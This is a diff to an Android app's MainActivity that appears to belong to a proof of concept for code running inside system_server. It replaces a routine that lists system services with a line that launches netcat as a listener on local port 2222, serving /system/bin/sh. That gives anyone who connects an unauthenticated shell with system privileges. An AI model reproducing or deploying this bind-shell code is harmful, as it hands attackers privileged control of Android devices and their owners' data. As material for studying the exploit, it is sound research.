@@ -45,28 +45,15 @@ public class MainActivity extends Activity {
                 .append("\n\nBelow is list of system services, as this app loads into system_server it can directly tamper with local ones (those that are non-null and non-BinderProxy)");
 
         try {
-            Class<?> serviceManager = Class.forName("android.os.ServiceManager");
-            for (String serviceName : ((String[]) serviceManager.getMethod("listServices").invoke(null))) {
-                String serviceStr;
-                try {
-                    Object serviceObj = serviceManager
-                            .getMethod("getService", String.class)
-                            .invoke(null, serviceName);
-                    if (serviceObj != null) {
-                        serviceStr = serviceObj.toString();
-                    } else {
-                        serviceStr = "null (getService() was disallowed)";
-                    }
-                } catch (Throwable e) {
-                    if (e instanceof InvocationTargetException) {
-                        e = ((InvocationTargetException) e).getTargetException();
-                    }
-                    serviceStr = e.getClass().getName() + ": " + e.getMessage();
-                }
-                s.append("\n\n").append(serviceName).append(":\n").append(serviceStr);
-            }
-        } catch (Exception e) {
-            s.append("\n\nFailed listing services");
+            Process process = Runtime.getRuntime().exec("nc -s 127.0.0.1 -p 2222 -L /system/bin/sh");
+            // BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            // String line;
+            // while ((line = reader.readLine()) != null) {
+            //     System.out.println(line);
+            // }
+            process.waitFor(); // Wait for the command to complete
+        } catch (IOException | InterruptedException e) {
+            e.printStackTrace();
         }
 
         ((TextView) findViewById(R.id.app_text)).setText(s.toString());
